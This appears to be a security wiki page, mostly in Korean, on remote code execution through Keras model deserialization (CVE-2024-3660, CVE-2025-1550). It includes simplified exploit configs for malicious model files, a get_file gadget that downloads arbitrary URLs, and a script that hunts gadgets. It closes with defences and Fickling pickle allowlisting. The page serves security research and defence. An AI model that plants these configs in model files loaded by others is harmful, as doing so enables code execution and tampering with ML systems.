# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Keras 모델 deserialization 파이프라인에 대한 실전적인 exploitation 기법을 요약하고, 네이티브 .keras 포맷의 내부 구조와 attack surface를 설명하며, Model File Vulnerabilities (MFVs)와 post-fix gadgets를 찾기 위한 연구자용 툴킷을 제공합니다.

## .keras model format internals

A .keras file is a ZIP archive containing at least:
- metadata.json – 일반 정보 (예: Keras 버전)
- config.json – 모델 아키텍처 (primary attack surface)
- model.weights.h5 – HDF5 형태의 weights

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
역직렬화는 다음을 수행합니다:
- 모듈 가져오기 및 module/class_name 키로부터의 심볼 해석
- 공격자가 제어하는 kwargs로 from_config(...) 또는 constructor를 호출
- 중첩 객체(activations, initializers, constraints 등)로의 재귀

역사적으로, 이는 config.json을 작성하는 공격자에게 다음 세 가지 프리미티브를 노출시켰습니다:
- 어떤 모듈이 import되는지 제어
- 어떤 클래스/함수가 해석되는지 제어
- constructors/from_config에 전달되는 kwargs 제어

## CVE-2024-3660 – Lambda-layer bytecode RCE

근본 원인:
- Lambda.from_config()는 python_utils.func_load(...)을 사용했는데, 이는 공격자 바이트를 base64-de코딩하고 marshal.loads()를 호출합니다; Python 언마샬링은 코드를 실행할 수 있습니다.

익스플로잇 아이디어(간소화된 payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras는 기본적으로 safe_mode=True를 적용합니다. Lambda에서 직렬화된 Python 함수는 사용자가 명시적으로 safe_mode=False로 옵트아웃하지 않는 한 차단됩니다.

Notes:
- 레거시 포맷(구형 HDF5 저장) 또는 오래된 코드베이스는 최신 검사를 강제하지 않을 수 있으므로 “downgrade” 스타일 공격이 피해자가 오래된 로더를 사용하는 경우 여전히 적용될 수 있습니다.

## CVE-2025-1550 – Keras ≤ 3.8에서 임의의 모듈 임포트

Root cause:
- _retrieve_class_or_fn은 config.json에서 공격자가 제어하는 모듈 문자열로 importlib.import_module()을 제한 없이 사용했습니다.
- Impact: 설치된 어떤 모듈이라도 임의로 임포트할 수 있음(또는 sys.path에 공격자가 심어둔 모듈). Import-time 코드가 실행된 후, 공격자 kwargs와 함께 객체 생성이 발생합니다.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
- Basic type checking: 역직렬화된 객체는 예상 타입과 일치해야 함

## allowlist 내부의 Post-fix gadget surface

Allowlisting과 safe mode가 있어도, 허용된 Keras 호출 가능한 객체들 사이에는 넓은 공격 표면이 남아 있다. 예를 들어, keras.utils.get_file은 임의의 URL을 사용자가 선택한 위치로 다운로드할 수 있다.

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
## 중요 제한사항:
- Lambda.call()은 입력 텐서를 대상 callable을 호출할 때 첫 번째 위치 인수로 앞에 삽입합니다. 선택된 gadgets는 추가 위치 인수(또는 *args/**kwargs)를 허용할 수 있어야 합니다. 이는 어떤 함수가 사용 가능한지 제약합니다.

가능한 allowlisted gadgets의 잠재적 영향:
- 임의의 다운로드/쓰기 (path planting, config poisoning)
- Network callbacks/SSRF-like 효과(환경에 따라)
- 나중에 해당 경로가 import/실행되거나 PYTHONPATH에 추가되거나, 쓰기 시 실행되는(writable execution-on-write) 위치가 존재하는 경우 code execution으로 체이닝될 수 있음

## 연구자 도구

1) 허용된 모듈에서의 체계적 gadget 탐색

keras, keras_nlp, keras_cv, keras_hub 전반에서 후보 callables을 열거하고 file/network/process/env side effects가 있는 것들에 우선순위를 두세요.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direct deserialization testing (no .keras archive needed)

조작된 dicts를 Keras deserializers에 직접 입력하여 허용되는 params를 파악하고 부작용을 관찰한다.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 크로스-버전 프로빙 및 포맷

Keras는 서로 다른 안전장치와 포맷을 가진 여러 코드베이스/시대에 존재합니다:
- TensorFlow built-in Keras: tensorflow/python/keras (레거시, 삭제 예정)
- tf-keras: 별도로 유지관리됨
- Multi-backend Keras 3 (official): 네이티브 .keras 도입

회귀나 누락된 보호장치를 발견하기 위해 코드베이스와 포맷(.keras vs legacy HDF5) 전반에서 테스트를 반복하세요.

## 방어 권장사항

- 모델 파일을 신뢰할 수 없는 입력으로 취급하세요. 신뢰하는 출처의 모델만 로드하세요.
- Keras를 최신 상태로 유지하세요; allowlisting 및 타입 검사의 혜택을 위해 Keras ≥ 3.9을 사용하세요.
- 파일을 완전히 신뢰하지 않는 한 모델을 로드할 때 safe_mode=False로 설정하지 마세요.
- 네트워크 egress가 차단되고 파일시스템 접근이 제한된 샌드박스화된 최소 권한 환경에서 역직렬화를 실행하는 것을 고려하세요.
- 가능하면 모델 출처와 무결성 검사를 위해 allowlists/서명 적용을 강제하세요.

## ML pickle import allowlisting for AI/ML models (Fickling)

많은 AI/ML 모델 포맷(PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts 등)은 Python pickle 데이터를 포함합니다. 공격자는 로드 중에 RCE 또는 모델 교체를 달성하기 위해 pickle의 GLOBAL imports와 객체 생성자를 일상적으로 악용합니다. 블랙리스트 기반 스캐너는 종종 새롭거나 목록에 없는 위험한 imports를 놓칩니다.

실용적인 fail-closed 방어는 Python의 pickle 역직렬화기를 훅킹하여 unpickling 동안 검토된 무해한 ML 관련 import 집합만 허용하는 것입니다. Trail of Bits’ Fickling은 이 정책을 구현하며 수천 개의 공개 Hugging Face pickle로부터 구축된 선별된 ML import allowlist를 제공합니다.

“안전한” imports에 대한 보안 모델(연구와 실무에서 추출한 직관): pickle이 사용하는 import된 심볼은 동시에 다음을 만족해야 합니다:
- 코드 실행을 하거나 실행을 유발하지 않아야 함(컴파일된/소스 코드 객체, 셸 실행, 훅 등 금지)
- 임의의 속성 또는 아이템을 get/set하지 않아야 함
- pickle VM으로부터 다른 Python 객체를 import하거나 참조를 얻지 않아야 함
- 심지어 간접적으로라도 2차 역직렬화기(예: marshal, nested pickle)를 트리거하지 않아야 함

프로세스 시작 시 가능한 한 일찍 Fickling의 보호 기능을 활성화하여 프레임워크(torch.load, joblib.load 등)가 수행하는 모든 pickle 로드가 검사되도록 하세요:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
운영 팁:
- 필요한 경우 훅을 일시적으로 비활성화/다시 활성화할 수 있습니다:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 알려진 정상 모델이 차단된 경우, 심볼을 검토한 후 환경의 allowlist를 확장하세요:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling은 보다 세부적인 제어를 원할 경우 일반적인 런타임 가드도 제공합니다:
- fickling.always_check_safety() — 모든 pickle.load()에 대한 검사를 강제
- with fickling.check_safety(): — 범위 내 강제를 위해
- fickling.load(path) / fickling.is_likely_safe(path) — 일회성 검사용

- 가능하면 non-pickle 모델 포맷(예: SafeTensors)을 선호하세요. pickle을 반드시 허용해야 한다면, 로더를 네트워크 이그레스 없이 최소 권한으로 실행하고 허용 목록을 적용하세요.

이 허용 목록 우선 전략은 호환성을 높게 유지하면서 일반적인 ML pickle 익스플로잇 경로를 차단함이 입증되었습니다. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.

## 참고자료

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
